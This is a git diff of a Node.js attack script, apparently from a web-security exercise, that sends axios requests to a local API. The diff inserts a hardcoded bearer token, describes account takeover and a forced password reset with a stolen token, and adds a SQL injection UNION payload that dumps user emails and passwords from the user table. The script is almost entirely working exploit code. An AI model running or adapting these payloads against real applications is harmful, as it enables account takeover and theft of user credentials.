@@ -4,7 +4,7 @@
 var axios = require('axios')
 
 //for attack 3 e 4, insert valid token
-var token = '' //insert here valid token
+var token = '2c97cd96b21c4a3c5e951740b8721e47eae5f8bda8f6f07edeec5c847bf9757cf042e3e787cf36060caf56277def48e003a6cf211801b66583098abd52364c33' //insert here valid token
 
 ///*** 1 ***////
 //With this attack, i can access to an user account (i have to know victim email)
@@ -41,7 +41,7 @@ axios.post( 'http://127.0.0.1:3001/api/user/register', data)
 //If we steal the token of another account (like over), with this attack we change the user's password to 123
 //The new password is saved in db equal to '123' and so, it's not a diggest
 //For the victim it will be impossible login into his account because the diggest will never
-// be composed by only two characters
+// be composed by only three characters
 axios({
     method: 'put',
     url:  'http://127.0.0.1:3001/api/user/name',
@@ -75,4 +75,23 @@ axios({
     console.log("4: " + error.message)
 })
 
+///*** 5 */
+//Using Union to steal value from db
+//post id is not valid but we wuold only get stolen values
+let post_id = "value' UNION SELECT mail, password, name, surname FROM user; -- -"
+
+axios({
+    method: 'get',
+    url:  'http://127.0.0.1:3001/api/comment/' + post_id,
+    headers: { Authorization: `Bearer ${token}` }
+})
+.then((response) => {
+    if(response.status==200){
+        console.log("5: ")
+        console.log(response.data)
+    }
+})
+.catch((error)=>{
+    console.log("5:" + error.message)
+})
 
